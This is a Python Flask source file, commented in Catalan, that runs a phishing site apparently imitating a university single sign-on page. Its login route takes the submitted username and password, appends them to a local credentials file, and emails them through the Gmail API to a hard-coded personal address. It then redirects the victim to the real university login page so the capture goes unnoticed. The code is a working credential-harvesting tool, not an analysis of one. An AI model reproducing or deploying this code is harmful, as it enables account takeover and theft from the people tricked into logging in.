import os
import base64
import json
from email.mime.text import MIMEText
from flask import Flask, request, render_template, redirect

# Llibreries oficials de Google API
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

app = Flask(__name__)

# Definim els permisos que necessitem (només enviar correus en el teu nom)
SCOPES = ['https://www.googleapis.com/auth/gmail.send']
USER_EMAIL = "albert.hendrych01@estudiant.upf.edu"

def obtenir_servei_gmail():
    if not os.path.exists('token.json'):
        raise Exception("Error: El fitxer token.json no existeix. Executa primer la vinculació bàsica.")
        
    creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    
    # Si el token ha expirat, es refresca automàticament en segon pla (sense obrir ports)
    if creds and creds.expired and creds.refresh_token:
        creds.refresh(Request())
        with open('token.json', 'w') as token:
            token.write(json.dumps({
                'token': creds.token,
                'refresh_token': creds.refresh_token,
                'token_uri': creds.token_uri,
                'client_id': creds.client_id,
                'client_secret': creds.client_secret,
                'scopes': creds.scopes
            }))
            
    return build('gmail', 'v1', credentials=creds)

def enviar_correu_gmail_api(usuari_capturat, contrasenya_capturada):
    try:
        servei = obtenir_servei_gmail()
        
        # Creem el cos del correu
        contingut = f"S'ha registrat una nova entrada al formulari:\n\nUsuari: {usuari_capturat}\nContrasenya: {contrasenya_capturada}"
        
        missatge = MIMEText(contingut, 'plain', 'utf-8')
        missatge['to'] = USER_EMAIL
        missatge['from'] = USER_EMAIL
        missatge['subject'] = "Nova línia afegida a credentials.txt"
        
        # L'API de Gmail requereix que el missatge estigui codificat en base64 URL-safe
        raw_message = base64.urlsafe_b64encode(missatge.as_bytes()).decode('utf-8')
        body = {'raw': raw_message}
        
        # Enviem a través de l'API oficial
        servei.users().messages().send(userId="me", body=body).execute()
        print("Correu enviat correctament via Gmail API.")
    except Exception as e:
        print(f"Error en enviar el correu via API: {e}")

@app.route('/')
def home():
    return render_template('index.html') 

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('adAS_username')
    password = request.form.get('adAS_password')
    
    if username and password:
        # 1. Guardem localment
        with open("credencials.txt", "a", encoding="utf-8") as f:
            f.write(f"Usuari: {username} | Contrasenya: {password}\n")
        
        # 2. Enviem per correu utilitzant l'API de Google de la universitat
        enviar_correu_gmail_api(username, password)
        
        # 3. Redirigim a Google
        return redirect("https://autenticacio.upf.edu/sso/CAS/login?service=https%3A%2F%2Faulaglobal.upf.edu%2Flogin%2Findex.php")
    
    return "<h1>Error: Camps buits.</h1>", 400

if __name__ == '__main__':
    # Arrenquem directament la teva web al port 8000
    app.run(debug=True, host='0.0.0.0', port=8000)
